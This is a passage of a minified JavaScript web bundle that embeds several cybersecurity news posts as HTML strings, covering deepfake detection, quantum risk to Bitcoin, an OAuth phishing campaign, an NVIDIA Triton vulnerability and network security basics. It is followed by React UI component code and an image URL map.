      <p>While global firms like Microsoft and Reality Defender dominate AI deepfake detection, Vastav is among the first real-time native systems purpose-built for India’s sociopolitical context. Its independence from western platforms ensures privacy, regional understanding, and sovereign scalability.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#4b5563;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #6366f1;padding-left:12px;">"In a world where truth is constantly distorted, Vastav AI is not just a defense mechanism — it’s a digital compass."</blockquote>
      <p>As India enters its AI decade, the launch of Vastav AI marks a new phase in securing digital truth. This 50th blog post celebrates not just a product but a national milestone — where cyber defense meets innovation, ethics, and urgency.</p>
    </section>

  </div>
`},{id:"quantum-bitcoin-resurrection-july-2025",title:"🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?",date:"2025-07-31",author:"EthicalByte",summary:"Quantum computers could soon unlock access to long-lost or dormant Bitcoin wallets by breaking the cryptography behind them. While it might sound like science fiction, the threat is real—and approaching faster than we think.",tags:["Quantum Computing","Bitcoin","ECDSA","Cryptography","Cybersecurity","Post-Quantum Security"],imageKey:"quantumBitcoinBanner",content:`
  <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?</h3><br>
      <p style="font-style:italic;">If quantum computers evolve faster than crypto standards, trillions in digital value could be cracked open.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#6a1b9a;">🌐 What’s the Big Idea?</h4><br>
      <p>Quantum computing poses a unique risk to digital assets like Bitcoin. These machines don’t just compute faster—they operate on a different mathematical paradigm. The <strong>Elliptic Curve Digital Signature Algorithm (ECDSA)</strong>—which secures Bitcoin’s private keys—was never built with quantum resistance in mind.</p>
      <p>This means a powerful enough quantum computer could <strong>derive a private key from a public Bitcoin address</strong>, especially if the public key has already been revealed through a previous transaction.</p>
    </section>

    <section style="margin-top:20px;background:#f3e5f5;padding:15px;border-radius:8px;">
      <h4 style="color:#4a148c;">💻 Technical Breakdown</h4><br>
      <ul>
        <li>🔐 <strong>ECDSA Vulnerability:</strong> Based on the difficulty of solving discrete logarithm problems — something classical computers struggle with, but quantum computers could crack with Shor’s Algorithm.</li>
        <li>⚛️ <strong>Shor’s Algorithm:</strong> Designed to factor large primes and solve problems underpinning public key cryptography—effectively reducing ECDSA’s complexity from “infeasible” to “solvable.”</li>
        <li>🧠 <strong>Quantum Readiness:</strong> Bitcoin addresses are safe until their public key is exposed (usually during outgoing transactions). After that, they become vulnerable.</li>
        <li>🧱 <strong>Blockchain Permanence:</strong> Once public keys are on the blockchain, they’re available forever — meaning they could be targeted years or decades later.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#00796b;">📉 What’s at Risk?</h4><br>
      <ul>
        <li>🪙 <strong>Lost Wallets:</strong> Over <strong>4 million Bitcoins</strong> (worth billions) are believed to be lost. Quantum breakthroughs could resurrect these—possibly into the wrong hands.</li>
        <li>👤 <strong>Early Users:</strong> Early adopters who used simple or reused keys are more at risk, especially if they’ve exposed public keys in past transactions.</li>
        <li>🏦 <strong>Exchanges & Custodians:</strong> Platforms holding crypto on behalf of clients must move fast to adopt post-quantum standards—or face systemic risk.</li>
        <li>📉 <strong>Market Panic:</strong> Even the rumor of a working quantum attack could shake global confidence and cause massive sell-offs.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d7ffd9;padding:15px;border-radius:8px;">
      <h4 style="color:#1b5e20;">🛡️ What Can We Do Today?</h4><br>
      <ul>
        <li>✅ <strong>Upgrade Wallets:</strong> Start using quantum-resistant or multi-signature wallets where possible.</li>
        <li>✅ <strong>Post-Quantum Research:</strong> Follow progress from <a href="https://csrc.nist.gov/projects/post-quantum-cryptography" target="_blank">NIST’s PQC initiative</a> which is finalizing algorithms immune to quantum attacks.</li>
        <li>✅ <strong>Network Vigilance:</strong> Developers and miners should begin discussions on quantum-safe forks and transitions for vulnerable coins.</li>
        <li>✅ <strong>Minimize Public Exposure:</strong> Refrain from reusing addresses and only reveal public keys when necessary.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#fffde7;padding:15px;border-radius:8px;">
      <h4 style="color:#f9a825;">📚 Did You Know?</h4><br>
      <ul>
        <li>📡 Google’s 2019 quantum supremacy experiment solved a problem in 200 seconds that would take supercomputers 10,000 years.</li>
        <li>🧩 Ethereum has similar cryptographic weaknesses — and Vitalik Buterin has publicly spoken about quantum concerns.</li>
        <li>🌍 Governments and intelligence agencies are already <strong>harvesting encrypted data</strong> today to decrypt later with quantum tools—a strategy known as “store now, decrypt later.”</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e3f2fd;padding:15px;border-radius:8px;">
      <h4 style="color:#1565c0;">🔭 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #1565c0;padding-left:10px;">"Quantum computing could be both the grave robber and the guardian of crypto."</blockquote>
      <p>Quantum threats to Bitcoin aren’t here yet — but they’re coming. Whether it’s by choice or by breach, the ecosystem must evolve. From the Bitcoin core dev team to casual holders, <strong>post-quantum migration plans must begin now</strong>.</p>
      <p>In a digital age where <strong>mathematics = trust</strong>, we must prepare for the moment when math itself gets upgraded.</p>
    </section>

  </div>
`},{id:"nigeria-ai-cybersecurity-gap-july-2025",title:"🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos",date:"2025-08-01",author:"EthicalByte",summary:"Sophos executive Prish Thaakar emphasizes how Nigerian organizations can leverage AI and machine learning to detect threats faster, reduce data breaches, and build resilience against evolving cyberattacks.",tags:["Nigeria","AI Security","Sophos","Cybersecurity Strategy","Prish Thaakar"],imageKey:"nigeriaAICybersecurityBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos</h3><br>
      <p style="font-style:italic;">Artificial Intelligence could become Nigeria’s frontline defense against digital threats.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">📢 What Happened?</h4><br>
      <p>According to <strong>Prish Thaakar</strong>, a senior executive at Sophos, Nigeria’s current cybersecurity posture can be significantly strengthened through AI-powered solutions.</p>
      <p>In an interview with Vanguard, he outlined how machine learning and automation could help Nigerian firms detect and respond to sophisticated threats in real time — reducing response time, cost, and human error.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🧠 Why AI Is a Game-Changer</h4><br>
      <ul>
        <li>🚨 <strong>Threat Prediction:</strong> AI models can anticipate attack patterns before they strike.</li>
        <li>⚙️ <strong>Automated Response:</strong> Machine learning can flag anomalies and trigger rapid responses without human delay.</li>
        <li>🔍 <strong>Data-Driven Insights:</strong> Organizations gain deeper understanding of attack surfaces and weak points.</li>
        <li>🔐 <strong>Scalability:</strong> Even small businesses can deploy AI tools to protect digital assets affordably.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">🌍 Nigeria’s Cybersecurity Landscape</h4><br>
      <p>Nigeria, like many developing nations, has faced rising incidents of ransomware, phishing, and insider attacks. A large digital population, coupled with under-resourced IT teams, has made the country vulnerable.</p>
      <p>By adopting AI tools from vendors like Sophos, Nigerian institutions could close detection gaps, protect customer data, and comply with national digital safety policies.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">✅ What Needs to Happen</h4><br>
      <ul>
        <li>💡 <strong>Upskilling:</strong> Encourage cybersecurity training to maximize AI tool usage.</li>
        <li>🔗 <strong>Public-Private Collaboration:</strong> Gov & private sectors must jointly invest in AI readiness.</li>
        <li>📊 <strong>Adoption of Threat Intelligence:</strong> Shareable, AI-enhanced threat feeds can increase collective resilience.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a connected world, cybersecurity is no longer optional — and AI is no longer futuristic.”</blockquote>
      <p>Prish Thaakar’s insights serve as a wake-up call for Nigeria’s cybersecurity industry. Strategic AI deployment could transform vulnerability into strength, and create a secure digital future for West Africa’s tech hub.</p>
    </section>

  </div>
`},{id:"microsoft-oauth-tycoon-phishing-august-2025",title:"🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached",date:"2025-08-02",author:"EthicalByte",summary:"A stealthy phishing campaign using fake Microsoft OAuth apps and the Tycoon kit has compromised thousands of Microsoft 365 accounts. It bypasses MFA and mimics over 50 known brands. This operation is a masterclass in modern-day identity hijacking.",tags:["OAuth","Phishing","Microsoft 365","Tycoon Kit","Cybersecurity","Adversary-in-the-middle"],imageKey:"microsoftOauthTycoonAttack",content:`
  <div style="background-color:#fbfbfb;padding:20px;border-radius:12px;border:1px solid #e0e0e0;">

    <div style="text-align:center;">
      <h3 style="color:#1a1a1a;">🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached</h3><br>
      <p style="font-style:italic;color:#666;">A phishing campaign so advanced, it didn’t need passwords.</p>
    </div>

    <p>
      A highly coordinated phishing operation has exploited fake Microsoft OAuth apps combined with the Tycoon phishing kit, breaching over <strong>3,000 users across 900 organizations</strong>. 
      The attackers bypassed Multi-Factor Authentication (MFA) using adversary-in-the-middle (AiTM) infrastructure and tricked victims into authorizing malicious applications — all while maintaining long-term access to cloud data.
    </p>

    <p>
      Victims clicked on phishing emails that led them to spoofed Microsoft login pages. These pages were actually AiTM proxies that intercepted credentials and authentication tokens. 
      From there, users were prompted to grant OAuth permissions to fake apps cleverly disguised as Microsoft Teams, Adobe, SharePoint, or DocuSign integrations.
    </p>

    <p>
      Once the permissions were granted, the attackers didn’t need usernames or passwords anymore. They could access emails, calendars, OneDrive files, and Teams messages — all through OAuth token access. 
      The Tycoon phishing kit automated much of the infrastructure, handling session hijacking, brand spoofing, and token persistence in a seamless flow.
    </p>

    <p>
      Microsoft confirmed that these fake apps were hosted in legitimate cloud environments and even passed basic domain verification. Because they abused the OAuth consent model, victims didn’t realize anything had gone wrong.
    </p>

    <div style="background:#fff3cd;padding:15px;border-radius:8px;margin-top:20px;border:1px solid #ffecb5;">
      <p><strong>Highlights:</strong><br>
      • 3,000+ users affected across 900+ companies<br>
      • 50+ spoofed app brands used to lure victims<br>
      • MFA bypassed with adversary-in-the-middle proxies<br>
      • Access granted via consent to fake OAuth apps<br>
      • Attackers used token refresh mechanisms to maintain persistence<br>
      </p>
    </div>

    <p style="margin-top:20px;">
      This is a critical lesson for defenders: Cloud security is not just about strong passwords or even MFA anymore. It’s about understanding how OAuth scopes and token lifetimes work, auditing what applications users are authorizing, and restricting third-party app access by default.
    </p>

    <p>
      Organizations are advised to review tenant-wide OAuth policies, restrict user consent, and regularly scan for anomalous cloud app activity. User education around fake app consent requests is now as vital as phishing awareness itself.
    </p>

    <p style="margin-top:20px;">
      This campaign is one of the most sophisticated examples of phishing-as-a-service we’ve seen in 2025 — stealthy, brand-polished, and identity-focused. It proves one thing: attackers no longer just want your credentials. They want your trust.
    </p>

  </div>
`},{id:"network-security-digital-era-august-2025",title:"🛡️ Network Security in the Digital Era: Safeguarding the Digital World",date:"2025-08-04",author:"EthicalByte",summary:"In an interconnected world, effective network security demands a multi-layered approach—from firewalls and IDS to training and incident planning. This blog explores what it takes to stay secure in 2025 and beyond.",tags:["Network Security","Cybersecurity Strategies","Digital Infrastructure","Encryption","Firewall","IDS"],imageKey:"networkSecurityDigitalEraBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
    
    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🛡️ Network Security in the Digital Era: Safeguarding the Digital World</h3><br>
      <p style="font-style:italic;">A secure network is no longer optional—it's the foundation of digital resilience.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">🌐 The Modern Threat Landscape</h4><br>
      <p>From ransomware attacks to nation-state espionage, today’s digital environment demands a proactive and robust network defense strategy. The increasing complexity of infrastructure and cloud integration introduces more attack vectors than ever before.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🔐 Building Stronger Defenses</h4><br>
      <ul>
        <li>🧱 <strong>Firewalls:</strong> Your first line of defense against unauthorized access.</li>
        <li>🕵️‍♂️ <strong>Intrusion Detection Systems (IDS):</strong> Real-time detection of suspicious activity.</li>
        <li>🔒 <strong>Encryption:</strong> End-to-end data protection during transmission and at rest.</li>
        <li>🛠️ <strong>Regular Software Updates:</strong> Patch known vulnerabilities before attackers do.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">👨‍🏫 Human Element in Cybersecurity</h4><br>
      <p>Technology alone isn’t enough. Employees are often the weakest link in the security chain. Consistent training on phishing awareness, password hygiene, and secure practices is critical to building a cyber-aware workforce.</p>
    </section>

    <section style="margin-top:20px;background:#f0f0f0;padding:15px;border-radius:8px;">
      <h4 style="color:#2a2a2a;">📦 Incident Response & Resilience</h4><br>
      <p>When prevention fails, response speed matters. An effective incident response plan minimizes damage, ensures regulatory compliance, and restores operations efficiently. Testing and updating the plan regularly is non-negotiable.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">🚀 Future-Proofing Security</h4><br>
      <ul>
        <li>🧠 Integrate AI/ML for anomaly detection.</li>
        <li>⚙️ Automate routine threat analysis.</li>
        <li>📡 Secure IoT devices and remote endpoints.</li>
        <li>📊 Conduct regular audits and penetration testing.</li>
      </ul>
      <p>As cyberattacks grow in sophistication, adapting and upgrading your defenses is critical for long-term resilience.</p>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">💡 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Cybersecurity is a journey, not a destination. Stay aware. Stay updated. Stay secure.”</blockquote>
      <p>Whether you're protecting a small business or managing national infrastructure, effective network security is the backbone of trust in a digital world. The threats are real—but so are the solutions.</p>
    </section>

  </div>
`},{id:"nvidia-triton-ai-rce-2025",title:"NVIDIA Triton AI Servers Can Be Hijacked — No Login Needed",date:"2025-08-05",author:"EthicalByte",summary:"New critical vulnerabilities in NVIDIA's Triton Inference Server expose AI infrastructure to unauthenticated remote code execution. Researchers warn it could lead to full model theft and unauthorized control.",tags:["NVIDIA","Triton","AI Security","Remote Code Execution","Model Theft","Unauthenticated Access"],imageKey:"nvidiaTritonExploit",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#c53030;">🚨 <br> Critical RCE Vulnerability in NVIDIA Triton AI Servers</h3><br>
      <h3>🧠 What Happened?</h3><br>
      <ul>
        <li>🚀 Researchers discovered a <strong>chain of vulnerabilities</strong> in <strong>NVIDIA’s Triton Inference Server</strong>.</li>
        <li>💥 Exploitation leads to <strong>unauthenticated remote code execution (RCE)</strong>.</li>
        <li>🎯 Attackers can fully hijack servers, steal AI models, manipulate predictions, or implant malware.</li>
        <li>🛠 The exploit starts with a <strong>single malformed HTTP request</strong> that bypasses authentication checks.</li>
      </ul>

      <h3>🔍 Why It Matters</h3><br>
      <p>NVIDIA Triton is widely used in AI production environments — including cloud AI workloads, model inference APIs, and internal ML Ops pipelines. A breach here could compromise:</p>
      <ul>
        <li>📊 Proprietary AI models & training data</li>
        <li>🔓 Intellectual property and competitive strategies</li>
        <li>🧠 Real-time inference results (autonomous driving, finance, etc.)</li>
      </ul>

      <h3>📌 Technical Overview</h3><br>
      <ul>
        <li>🧱 Vulnerabilities are related to insecure default settings and improper input sanitization in the model control APIs.</li>
        <li>🌐 No login or API key needed in certain misconfigured environments — opens up direct access to attackers.</li>
        <li>⚠ Unpatched Triton servers are a serious security risk in shared compute clusters and cloud workloads.</li>
      </ul>

      <h3>🛡 Recommendations</h3><br>
      <ul>
        <li>📥 Immediately update to the latest patched Triton release.</li>
        <li>🔐 Enforce strict authentication and tokenized API access.</li>
        <li>📉 Disable unused endpoints and monitor for anomalous inference requests.</li>
        <li>🛑 Limit external exposure of Triton instances and apply network segmentation.</li>
      </ul>

      <h3>📢 Final Thoughts</h3><br>
      <p>This is another stark reminder that <strong>AI infrastructure is a prime cyber target</strong>. As ML models become central to business and innovation, securing inference endpoints is no longer optional — it’s mission-critical.</p>

      <blockquote style="border-left:4px solid #c53030;padding-left:1em;margin-top:1em;">
        One malformed packet — and your AI is under enemy control.
      </blockquote>
    </div>
  `},{id:"generative-ai-cybersecurity-role",title:"The Role of Generative AI in Cybersecurity",date:"2025-08-06",author:"EthicalByte",summary:"Generative AI isn’t just for content—it’s changing cybersecurity too. From simulating attacks to anomaly detection, learn how AI is transforming defenses.",tags:["Generative AI","Cybersecurity","AI Security","Threat Detection","Cyber Defense"],imageKey:"generativeAICyberBanner",content:`
    <div style="background:linear-gradient(135deg,#e0e7ff,#f0fdf4);padding:1.5em;border-radius:12px;color:#111;">
      <h3>🧠 The Role of Generative AI in Cybersecurity</h3><br>
      
      <p>Generative AI has moved far beyond art tools and chat assistants—it's now playing a critical role in shaping how we <strong>defend against cyber threats</strong>. As digital threats grow more sophisticated, defenders are turning to AI to keep pace.</p>
      
      <h3>🔍 What Can Generative AI Do?</h3><br>
      <ul>
        <li>🛠 <strong>Simulate Cyberattacks:</strong> Generative AI can mimic real-world cyberattacks to test your systems, making red teaming and penetration testing faster and more realistic.</li>
        <li>📈 <strong>Detect Anomalies:</strong> By analyzing system logs and traffic patterns, it can highlight suspicious behavior that traditional systems might miss.</li>
        <li>🔄 <strong>Automated Threat Modeling:</strong> AI systems can generate evolving attack scenarios that adapt to real-time defenses.</li>
        <li>🔐 <strong>Enhance Zero Trust Architecture:</strong> AI helps verify access continuously by understanding user behavior profiles.</li>
      </ul>

      <h3>🚨 Why It Matters</h3><br>
      <p>Attackers are already experimenting with AI for phishing, deepfakes, and malware. We need to meet fire with fire. Generative AI gives defenders a way to:</p>
      <ul>
        <li>🛡 Proactively identify vulnerabilities</li>
        <li>⚡ Respond faster to threats</li>
        <li>📊 Visualize complex threat data intuitively</li>
      </ul>

      <h3>🎯 Get 1% Better at Cybersecurity Today</h3><br>
      <p>Learning never stops in this field. If you're serious about stepping up your game in cybersecurity</p>
     

      <h3>📌 Final Thoughts</h3><br>
      <p>Generative AI is a double-edged sword. But in the right hands, it can become a powerful tool for protecting networks, systems, and data. The future of cybersecurity will be human + AI—working side by side to outsmart evolving threats.</p>

      <blockquote style="border-left:4px solid #2563eb;padding-left:1em;margin-top:1em;">
        ⚡ Stay ahead. Learn fast. Defend smart.
      </blockquote>
    </div>
  `},{id:"network-security-digital-era-2025",title:"Network Security in the Digital Era: Safeguarding the Digital World",date:"2025-08-07",author:"EthicalByte",summary:"Explore the evolving landscape of network security, its challenges, and why a multi-layered defense strategy is crucial to protecting digital assets in 2025 and beyond.",tags:["network security","cybersecurity","encryption","firewalls","incident response","digital safety"],imageKey:"networkSecurityDigitalEraBanner",content:`
    <div style="background: linear-gradient(to right, #0f2027, #203a43, #2c5364); padding: 24px; border-radius: 12px; color: #f8f8f8; font-family: system-ui, sans-serif;">
    
    <h3>🛡️ <br> Network Security in the Digital Era<br>Why Defense in Depth is No Longer Optional</h3><br>

    <p>In an age where data breaches dominate headlines and ransomware paralyzes corporations, <strong>network security</strong> is more than a technical necessity—it’s a strategic business priority. As our homes, cars, offices, and cities go digital, cyber attackers gain a wider surface to exploit. The only effective response? A defense-in-depth approach that blends people, processes, and technology.</p>

    <h3>🚨 Understanding the Risks</h3><br>
    <p>Modern networks face threats on all fronts—cloud misconfigurations, remote access vulnerabilities, insider threats, and increasingly, AI-driven attacks. It's no longer a matter of *if*, but *when* an attack occurs. Preparation and visibility are key.</p>

    <h3>🧱 Core Elements of Strong Network Security</h3><br>
    <ul>
      <li><strong>Firewalls & NGFW:</strong> Control inbound and outbound traffic, and block known malicious IPs and ports.</li>
      <li><strong>IDS/IPS:</strong> Detect and prevent threats using behavior and signature-based scanning.</li>
      <li><strong>Encryption:</strong> Use protocols like TLS 1.3, IPsec, and AES-256 to protect data in transit and at rest.</li>
      <li><strong>Zero Trust Architecture:</strong> Never trust, always verify—every user, every device, every time.</li>
    </ul>

    <h3>👨‍🏫 People: The First Line of Defense</h3><br>
    <p>Humans are both your strongest and weakest link. Educate your employees through continuous training. Include:</p>
    <ul>
      <li>🎯 <strong>Simulated Phishing Attacks</strong> — test awareness and response.</li>
      <li>🔐 <strong>Password Hygiene</strong> — promote use of password managers and MFA.</li>
      <li>🚨 <strong>Breach Response Training</strong> — know how to spot and escalate threats.</li>
    </ul>

    <h3>🛠️ Technical Best Practices</h3><br>
    <ul>
      <li>🕵️‍♂️ Implement deep packet inspection on critical segments.</li>
      <li>🧩 Microsegment your network — isolate business-critical systems.</li>
      <li>📦 Disable unused ports and services to minimize attack surface.</li>
      <li>📅 Use automated patch management to fix vulnerabilities faster.</li>
    </ul>

    <h3>📋 Building an Incident Response Framework</h3><br>
    <p>No system is impenetrable. That’s why a detailed and tested <strong>incident response plan</strong> is essential. It should include:</p>
    <ul>
      <li>🚨 Detection mechanisms (SIEM, EDR, NDR)</li>
      <li>📞 Clear communication protocols during breaches</li>
      <li>🔁 Post-incident reviews and documentation</li>
    </ul>

    <h3>🌐 The Cloud Factor</h3><br>
    <p>Most organizations are now hybrid or fully cloud-based. Protect cloud networks by enforcing:</p>
    <ul>
      <li>🔐 Proper IAM configurations (least privilege access)</li>
      <li>🧮 Audit logs and anomaly detection</li>
      <li>🧩 Secure API management</li>
    </ul>

    <h3>🔍 Real-Time Threat Intelligence</h3><br>
    <p>Security teams must stay ahead of the curve. Subscribe to global threat feeds, integrate with your SIEM, and automate detection using machine learning. This enables predictive defense—not just reactive response.</p>

    <h3>🤖 AI & Automation in Network Security</h3><br>
    <p>Modern threats move fast. So must your defenses. Leverage AI for:</p>
    <ul>
      <li>⚡ Anomaly detection in real-time network traffic</li>
      <li>⛔ Automated quarantine of infected endpoints</li>
      <li>🔄 Automated playbooks for common threats</li>
    </ul>

    <h3>🎓 Learn & Upskill</h3><br>
    <p>Interested in a career in network security? Begin with these resources:</p>
    <ul>
      <li>📚 CompTIA Security+</li>
      <li>🔐 Cisco CCNA/CCNP Security</li>
      <li>💡 Network+ & OSI Model Fundamentals</li>
      <li>⚙️ Practice in labs like Hack The Box or TryHackMe</li>
    </ul>

    <blockquote style="border-left: 4px solid #00bcd4; padding-left: 1em; margin-top: 1em;">
    🔐 <strong>Stay curious. Stay cautious. Stay secure.</strong><br>
   <br>

    <h3>🔚 Final Thoughts</h3><br>
    <p>The digital world is only as safe as the networks it runs on. Cybersecurity isn’t a one-time investment—it’s a constant journey of adaptation and vigilance. Build security into every layer of your infrastructure, and never stop learning.</p>


    </div>
  `}],N1=n=>jc.find(r=>r.id===n),fm=Te.forwardRef(({className:n,...r},o)=>x.jsx("div",{ref:o,className:vt("rounded-lg border bg-card text-card-foreground shadow-sm",n),...r}));fm.displayName="Card";const gm=Te.forwardRef(({className:n,...r},o)=>x.jsx("div",{ref:o,className:vt("flex flex-col space-y-1.5 p-6",n),...r}));gm.displayName="CardHeader";const mm=Te.forwardRef(({className:n,...r},o)=>x.jsx("h3",{ref:o,className:vt("text-2xl font-semibold leading-none tracking-tight",n),...r}));mm.displayName="CardTitle";const ym=Te.forwardRef(({className:n,...r},o)=>x.jsx("p",{ref:o,className:vt("text-sm text-muted-foreground",n),...r}));ym.displayName="CardDescription";const vm=Te.forwardRef(({className:n,...r},o)=>x.jsx("div",{ref:o,className:vt("p-6 pt-0",n),...r}));vm.displayName="CardContent";const bm=Te.forwardRef(({className:n,...r},o)=>x.jsx("div",{ref:o,className:vt("flex items-center p-6 pt-0",n),...r}));bm.displayName="CardFooter";const L1=Bf("inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),Cn=Te.forwardRef(({className:n,variant:r,size:o,asChild:a=!1,...c},p)=>{const d=a?ob:"button";return x.jsx(d,{className:vt(L1({variant:r,size:o,className:n})),ref:p,...c})});Cn.displayName="Button";const gs={default:"https://images.unsplash.com/photo-1549287540-b5e39fc85fa1",zeroDayThreat:"https://ethicalbyte.in/blogs/img/1.webp",phishingConcept:"https://ethicalbyte.in/blogs/img/2.webp",passwordSecurity:"https://ethicalbyte.in/blogs/img/3.webp",vpnConcept:"https://ethicalbyte.in/blogs/img/4.webp",ransomwareLock:"https://ethicalbyte.in/blogs/img/5.webp",iotNetwork:"https://ethicalbyte.in/blogs/img/6.webp",aiCyberThreat:"https://ethicalbyte.in/blogs/img/7.webp",linuxKernelBreach:"https://ethicalbyte.in/blogs/img/8.webp",socialThreats:"https://ethicalbyte.in/blogs/img/9.webp",apt29GmailAttack:"https://ethicalbyte.in/blogs/img/10.webp",passwordLeak16B:"https://ethicalbyte.in/blogs/img/11.webp",gmailPasskeyUpgrade:"https://ethicalbyte.in/blogs/img/12.webp",iranTvHijack:"https://ethicalbyte.in/blogs/img/13.webp",smishingAlert:"https://ethicalbyte.in/blogs/img/14.webp",weeklyCyberRecap:"https://ethicalbyte.in/blogs/img/15.webp",deleteHarmfulApps:"https://ethicalbyte.in/blogs/img/16.webp",chromeZeroDayExploit:"https://ethicalbyte.in/blogs/img/17.webp",fileUploadPhishing:"https://ethicalbyte.in/blogs/img/18.webp",scatteredSpiderAirline:"https://ethicalbyte.in/blogs/img/19.webp",chromeFirefoxUpdate:"https://ethicalbyte.in/blogs/img/20.webp",northKoreaZoomMalware:"https://ethicalbyte.in/blogs/img/21.webp",googleDataVerdict:"https://ethicalbyte.in/blogs/img/22.webp",taiwanChineseApps:"https://ethicalbyte.in/blogs/img/23.webp",catwatchfulSpyware:"https://ethicalbyte.in/blogs/img/24.webp",vishingQantas:"https://ethicalbyte.in/blogs/img/25.webp",euProtectEU:"https://ethicalbyte.in/blogs/img/26.webp",ingramMicroRansomware:"https://ethicalbyte.in/blogs/img/27.webp",maliciousEsDomains:"https://ethicalbyte.in/blogs/img/28.webp",perfektBlueCarHack:"https://ethicalbyte.in/blogs/img/29.webp",cyberTalk2025Banner:"https://ethicalbyte.in/blogs/img/30.webp",deepfakeThreatBanner:"https://ethicalbyte.in/blogs/img/31.webp",nipponSteelBreachBanner:"https://ethicalbyte.in/blogs/img/32.webp",ntroPhishingBanner:"https://ethicalbyte.in/blogs/img/33.webp",evChargingVulnBanner:"https://ethicalbyte.in/blogs/img/34.webp",jackMessagingAppBanner:"https://ethicalbyte.in/blogs/img/35.webp",louisVuittonBreachBanner:"https://ethicalbyte.in/blogs/img/36.webp",oracleJuly2025PatchBanner:"https://ethicalbyte.in/blogs/img/37.webp",bciCybersecurityBanner:"https://ethicalbyte.in/blogs/img/38.webp",mcdonaldsAIHiringBreachBanner:"https://ethicalbyte.in/blogs/img/39.webp",blockchainThreatIntelBanner:"https://ethicalbyte.in/blogs/img/40.webp",tiktokEUPrivacyBanner:"https://ethicalbyte.in/blogs/img/41.webp",massistantSurveillanceBanner:"https://ethicalbyte.in/blogs/img/42.webp",apt41AfricaSharePointBanner:"https://ethicalbyte.in/blogs/img/43.webp",coindcxBreachBanner:"https://ethicalbyte.in/blogs/img/44.webp",staccAttackBanner:"https://ethicalbyte.in/blogs/img/45.webp",usbCableHackingBanner:"https://ethicalbyte.in/blogs/img/46.webp",laughingMantisBanner:"https://ethicalbyte.in/blogs/img/47.webp",allianzBreachBanner:"https://ethicalbyte.in/blogs/img/48.webp",cargoTalonBanner:"https://ethicalbyte.in/blogs/img/49.webp",vastavAIDeepfakeBanner:"https://ethicalbyte.in/blogs/img/50.webp",quantumBitcoinBanner:"https://ethicalbyte.in/blogs/img/51.webp",nigeriaAICybersecurityBanner:"https://ethicalbyte.in/blogs/img/52.webp",microsoftOauthTycoonAttack:"https://ethicalbyte.in/blogs/img/53.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/54.webp",nvidiaTritonExploit:"https://ethicalbyte.in/blogs/img/55.webp",generativeAICyberBanner:"https://ethicalbyte.in/blogs/img/56.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/57.webp"},wm=({post:n})=>{const{theme:r}=Xn(),o={hidden:{opacity:0,y:20},visible:{opacity:1,y:0},hover:{scale:1.02,boxShadow:r==="dark"?"0px 10px 20px hsla(var(--primary), 0.25)":"0px 8px 25px rgba(0, 0, 0, 0.08)"}},a=r==="dark"?"bg-card border-border hover:border-primary/60":"bg-card border-border hover:border-primary/40",c=r==="dark"?"text-primary hover:text-primary/80":"text-foreground hover:text-primary",p=r==="dark"?"text-slate-400":"text-muted-foreground",d=r==="dark"?"text-slate-300":"text-foreground/80",h=r==="dark"?"text-accent hover:text-accent/80":"text-primary hover:text-primary/80",g=gs[n.imageKey]||gs.default,f=`#/post/${n.id}`;return 